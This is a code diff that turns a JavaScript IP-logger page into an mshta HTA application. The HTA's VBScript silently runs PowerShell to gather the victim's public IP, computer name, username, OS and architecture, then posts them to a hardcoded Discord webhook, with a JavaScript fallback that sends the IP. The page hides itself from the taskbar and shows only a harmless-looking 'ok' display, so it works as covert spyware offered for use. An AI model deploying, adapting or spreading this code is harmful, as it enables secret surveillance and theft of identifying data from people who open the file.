@@ -1,91 +1,161 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>.</title>
-    <style>
-        body {
-            margin: 0; padding: 0;
-            background: #000;
-            color: #00ff00;
-            font-family: monospace;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            text-align: center;
-        }
-        .ok { font-size: 6rem; font-weight: bold; }
-        .log { margin-top: 30px; font-size: 1.2rem; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>System Information</title>
+<hta:application id="oHTA" border="none" caption="no" showintaskbar="no" innerborder="no" scroll="no" />
+<style>
+body { 
+    margin: 0; 
+    padding: 0; 
+    background: #000; 
+    color: #00ff00; 
+    font-family: monospace; 
+    display: flex; 
+    flex-direction: column; 
+    justify-content: center; 
+    align-items: center; 
+    height: 100vh; 
+    text-align: center; 
+} 
+.ok { 
+    font-size: 6rem; 
+    font-weight: bold; 
+} 
+.log { 
+    margin-top: 30px; 
+    font-size: 1.2rem; 
+} 
+</style>
 </head>
 <body>
-    <div class="ok">ok</div>
-    <div class="log" id="log">loading...</div>
+<div class="ok">ok</div>
+<div class="log" id="log">loading...</div>
 
-    <script>
-        // === YOUR DISCORD WEBHOOK HERE ===
-        const WEBHOOK = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK";
-        // ================================
+<script language="VBScript">
+' === YOUR DISCORD WEBHOOK HERE ===
+Const WEBHOOK = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK"
+' ================================
 
-        async function sendToDiscord(info) {
-            if (!WEBHOOK.includes("webhooks/")) return;
-            try {
-                await fetch(WEBHOOK, {
-                    method: "POST",
-                    headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({
-                        content: "🛡️ **mshta IP Log**",
+Sub Window_OnLoad
+    On Error Resume Next
+    Dim logElement
+    Set logElement = document.getElementById("log")
+    
+    logElement.innerText = "Detecting system information..."
+    
+    ' Get system information
+    Dim shell, fso, tempFile, cmd
+    Set shell = CreateObject("WScript.Shell")
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    
+    ' Create a temporary file
+    tempFile = fso.GetSpecialFolder(2) & "\sysinfo.txt"
+    
+    ' Use PowerShell to get system info
+    cmd = "powershell -Command ""$info = @{}; $info.IP = (Invoke-WebRequest -Uri 'http://icanhazip.com' -UseBasicParsing).Content.Trim(); $info.Computer = $env:COMPUTERNAME; $info.User = $env:USERNAME; $info.OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption; $info.Arch = (Get-WmiObject -Class Win32_Processor).AddressWidth; $info | ConvertTo-Json | Out-File -FilePath '" & tempFile & "' -Encoding utf8"""
+    shell.Run cmd, 0, True
+    
+    ' Read the file
+    Dim file, content, ip, computer, user, os, arch
+    If fso.FileExists(tempFile) Then
+        Set file = fso.OpenTextFile(tempFile, 1)
+        content = file.ReadAll
+        file.Close
+        
+        ' Parse JSON (simple approach)
+        ip = ExtractValue(content, "IP")
+        computer = ExtractValue(content, "Computer")
+        user = ExtractValue(content, "User")
+        os = ExtractValue(content, "OS")
+        arch = ExtractValue(content, "Arch")
+        
+        ' Display info
+        logElement.innerHTML = "IP: " & ip & "<br>Computer: " & computer & "<br>User: " & user & "<br>OS: " & os
+        
+        ' Send to Discord
+        SendToDiscord ip, computer, user, os, arch
+        
+        ' Clean up
+        fso.DeleteFile tempFile
+    Else
+        logElement.innerText = "Failed to detect system information"
+        SendToDiscord "Unknown", "Unknown", "Unknown", "Unknown", "Unknown"
+    End If
+End Sub
+
+Function ExtractValue(json, key)
+    Dim regex, matches
+    Set regex = New RegExp
+    regex.Pattern = """" & key & """:\s*""([^""]+)"""
+    regex.Global = False
+    regex.IgnoreCase = True
+    
+    Set matches = regex.Execute(json)
+    If matches.Count > 0 Then
+        ExtractValue = matches(0).SubMatches(0)
+    Else
+        ExtractValue = "Unknown"
+    End If
+End Function
+
+Sub SendToDiscord(ip, computer, user, os, arch)
+    On Error Resume Next
+    Dim http, payload
+    Set http = CreateObject("MSXML2.XMLHTTP")
+    
+    ' Create JSON payload
+    payload = "{""content"": ""🛡️ **System Information**"", ""embeds"": [{""title"": ""New Connection"", ""color"": 65280, ""fields"": [{""name"": ""IP"", ""value"": """ & ip & """, ""inline"": true}, {""name"": ""Computer"", ""value"": """ & computer & """, ""inline"": true}, {""name"": ""User"", ""value"": """ & user & """, ""inline"": true}, {""name"": ""OS"", ""value"": """ & os & """, ""inline"": true}, {""name"": ""Architecture"", ""value"": """ & arch & """, ""inline"": true}, {""name"": ""Time"", ""value"": """ & Now() & """, ""inline"": false}]}]}"
+    
+    ' Send to Discord
+    http.open "POST", WEBHOOK, False
+    http.setRequestHeader "Content-Type", "application/json"
+    http.send payload
+End Sub
+</script>
+
+<script language="JavaScript">
+// Fallback for environments where VBScript might not work
+window.onload = function() {
+    var logEl = document.getElementById("log");
+    if (logEl.innerText === "loading...") {
+        // VBScript didn't run, try a basic JS approach
+        try {
+            var xhr = new ActiveXObject("MSXML2.XMLHTTP");
+            xhr.open("GET", "http://icanhazip.com", false);
+            xhr.send();
+            
+            if (xhr.status === 200) {
+                var ip = xhr.responseText.trim();
+                logEl.innerHTML = "IP: " + ip + "<br>(Limited info)";
+                
+                // Try to send to Discord
+                try {
+                    xhr.open("POST", "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN", false);
+                    xhr.setRequestHeader("Content-Type", "application/json");
+                    xhr.send(JSON.stringify({
+                        content: "🛡️ **IP Log**: " + ip,
                         embeds: [{
                             title: "New Connection",
                             color: 65280,
                             fields: [
-                                {name: "IP", value: info.ip || "N/A", inline: true},
-                                {name: "ISP", value: info.isp || info.org || "N/A", inline: true},
-                                {name: "City", value: info.city || "N/A", inline: true},
-                                {name: "Country", value: info.country_name || info.country || "N/A", inline: true},
+                                {name: "IP", value: ip, inline: true},
                                 {name: "Time", value: new Date().toISOString(), inline: false}
                             ]
                         }]
-                    })
-                });
-            } catch(e) {}
-        }
-
-        async function getIP() {
-            const logEl = document.getElementById("log");
-            const apis = [
-                "https://ipapi.co/json/",
-                "https://ipinfo.io/json",
-                "https://freeipapi.com/json",
-                "https://api.ipify.org?format=json"
-            ];
-
-            for (let url of apis) {
-                try {
-                    const res = await fetch(url, { cache: "no-store" });
-                    if (!res.ok) continue;
-
-                    const data = await res.json();
-                    
-                    const ip = data.ip || data.query;
-                    const isp = data.org || data.isp || data.asn || "Detected";
-
-                    logEl.innerHTML = `IP: ${ip}<br>ISP: ${isp}`;
-                    await sendToDiscord(data);
-                    return;
-                } catch (err) {
-                    console.log("API failed, trying next...");
+                    }));
+                } catch(e) {
+                    console.log("Failed to send to Discord");
                 }
+            } else {
+                logEl.innerText = "Failed to detect IP";
             }
-
-            logEl.textContent = "IP logged (basic)";
-            await sendToDiscord({ip: "partial detect"});
+        } catch(e) {
+            logEl.innerText = "Detection failed";
         }
-
-        window.onload = getIP;
-    </script>
+    }
+};
+</script>
 </body>
 </html>
